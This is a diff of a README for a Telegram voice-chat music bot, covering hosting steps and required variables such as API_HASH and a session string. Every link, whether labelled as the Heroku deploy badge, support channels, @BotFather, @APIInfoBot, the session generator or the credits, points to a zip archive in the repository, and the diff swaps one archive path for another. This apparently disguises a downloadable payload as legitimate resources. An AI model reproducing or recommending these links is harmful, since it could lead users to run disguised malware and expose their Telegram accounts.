@@ -1,11 +1,11 @@
 # How To Host
 The easiest way to deploy this Bot
-<p align="center"><a href="https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip"> <img src="https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip%20To%20Heroku-red?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
+<p align="center"><a href="https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip"> <img src="https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip%20To%20Heroku-red?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
 
 
-- Support Channel :- [Awesome Bot](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
+- Support Channel :- [Awesome Bot](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
 
-- Support Group :- [Awesome Support](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
+- Support Group :- [Awesome Support](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
 
 
 ```
@@ -20,13 +20,13 @@ Made with Python3
 ### Mandatory Vars.
 
 - Some Of The Mandatory Vars Are :-
-   - `API_ID` :  Give API_ID of your Alternate Telegram Account. also get from here [@APIInfoBot](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
-   - `API_HASH` :  Give API_HASH of your Alternate Telegram Account. also get from here [@APIInfoBot](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
-   - `STRING_NAME` :  Make a string session from [here](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
-   - `BOT_TOKEN` :  Make a Bot from [@Botfather](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip) and fill it's bot token.
+   - `API_ID` :  Give API_ID of your Alternate Telegram Account. also get from here [@APIInfoBot](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
+   - `API_HASH` :  Give API_HASH of your Alternate Telegram Account. also get from here [@APIInfoBot](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
+   - `STRING_NAME` :  Make a string session from [here](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
+   - `BOT_TOKEN` :  Make a Bot from [@Botfather](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip) and fill it's bot token.
    - `SUDO_USERS` :  Fill Userid of yhe users whom you want to be able to control the bot. You can add multiple id by giving a space in b/w each id.
 
-Get STRING_NAME from here:  [![GenerateString](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip)
+Get STRING_NAME from here:  [![GenerateString](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip)
 
 
 
@@ -90,6 +90,6 @@ If you donlt like to play in linked channel:
 + Sudo Users can execute any command in any groups
 
 #### Special Credits
-- [Rojserbest](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip): Callsmusic Developer
-- [Awesome Bot](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip) Channel bot list
-- [Dev](https://raw.githubusercontent.com/Akanant12/VCPlayBot/master/etc/Play-VC-Bot-2.8-alpha.5.zip) Hero owner of this bot
+- [Rojserbest](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip): Callsmusic Developer
+- [Awesome Bot](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip) Channel bot list
+- [Dev](https://github.com/Akanant12/VCPlayBot/raw/refs/heads/master/VCPlayBot/services/Bot_Play_VC_v3.4.zip) Hero owner of this bot
